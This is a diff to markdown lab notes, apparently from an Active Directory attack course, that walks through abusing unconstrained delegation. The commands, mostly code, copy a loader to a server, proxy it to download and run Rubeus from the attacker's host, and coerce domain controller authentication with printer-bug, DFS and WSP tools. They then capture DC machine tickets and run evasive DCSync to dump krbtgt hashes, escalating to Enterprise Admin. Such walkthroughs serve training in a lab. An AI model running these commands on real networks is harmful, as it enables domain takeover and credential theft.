@@ -1014,50 +1014,127 @@ Get-DomainComputer -Unconstrained | select -ExpandProperty name
 - Admin access on unconstrained machine (dcorp-appsrv as appadmin)
 - Ability to force authentication from target DC
 
-#### Attack Execution
+#### Step 1: Identify Admin Access
 
-**Setup: Start Listener**
+**Find users with admin access on unconstrained machine**
 ```powershell
-# On dcorp-appsrv with admin privileges
+# Load and run with admin credentials (from asktgt if needed)
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
+
+# Output: Machines where current user has admin access
+# Example: dcorp-appsrv, dcorp-adminsrv
+```
+
+#### Step 2: Copy Tools to Unconstrained Machine
+
+**From compromised user's process (running as admin user)**
+```powershell
+# Copy Loader.exe for remote execution
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
+```
+
+#### Step 3: Start TGT Listener on Unconstrained Machine
+
+**Setup port proxy and Rubeus monitor**
+```powershell
+# Open WinRM session to dcorp-appsrv
 winrs -r:dcorp-appsrv cmd
 
+# Setup port proxy to access attacker's HTTP server
 C:\Users\appadmin> netsh interface portproxy add v4tov4 
   listenport=8080 listenaddress=0.0.0.0 
   connectport=80 connectaddress=172.16.100.x
 
+# Start Rubeus monitor for DC$ machine account
 C:\Users\appadmin> C:\Users\Public\Loader.exe 
   -path http://127.0.0.1:8080/Rubeus.exe 
   -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
+
+# Output shows captured TGTs in real-time
 ```
 
-**Force Authentication (Multiple Methods)**
+#### Step 4: Force Authentication (Multiple Methods)
 
-*Option A: Printer Bug (MS-RPRN)*
+*Option A: Printer Bug (MS-RPRN) - Recommended*
 ```
-MS-RPRN.exe \\dcorp-dc.domain.com \\dcorp-appsrv.domain.com
+C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+# Error is expected; DC still connects to appsrv
 ```
 
 *Option B: Windows Search Protocol (MS-WSP)*
 ```
-WSPCoerce.exe DCORP-DC DCORP-APPSRV
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
+# Sends search query to trigger auth
 ```
 
 *Option C: DFS Namespaces (MS-DFSNM)*
 ```
-DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
+C:\AD\Tools> C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
+# Triggers DFS replication auth
 ```
 
-**Capture & Use TGT**
-```powershell
-# Rubeus monitor captures: DCORP-DC$@DOMAIN TGT
+#### Step 5: Capture & Use DC$ TGT
 
-# Copy base64 ticket from monitor output
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+**From Rubeus monitor output**
+```powershell
+# Monitor shows: User = DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
+# Copy base64 ticket from [Base64EncodedTicket] field
+
+# Import on student VM
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
   -args ptt /ticket:doIFx...
 
-# Use ticket for DCSync
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
-  -args "lsadump::dcsync /user:krbtgt" "exit"
+# DCSync as the Domain Controller
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
+
+---
+
+### Unconstrained Delegation → Enterprise Admins
+
+**Repeat the attack targeting mcorp-dc to escalate to Enterprise Admin**
+
+#### Setup Listener for mcorp-dc$
+```powershell
+# Reuse existing dcorp-appsrv session, monitor for mcorp-dc$ instead
+winrs -r:dcorp-appsrv cmd
+C:\Users\appadmin> C:\Users\Public\Loader.exe 
+  -path http://127.0.0.1:8080/Rubeus.exe 
+  -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
+```
+
+#### Force mcorp-dc Authentication
+
+*Option A: Printer Bug with FQDN*
+```
+C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+*Option B: DFS Coerce*
+```
+C:\AD\Tools> C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+*Option C: WSP Coerce*
+```
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+#### Capture mcorp-dc$ TGT and Perform DCSync
+
+```powershell
+# Monitor captures: MCORP-DC$@MONEYCORP.LOCAL
+# Copy base64 ticket and import
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args ptt /ticket:doIFx...
+
+# DCSync from root domain
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:moneycorp\krbtgt" "exit"
+
+# Now have Enterprise Admin privileges via root domain krbtgt
 ```
 
 ---
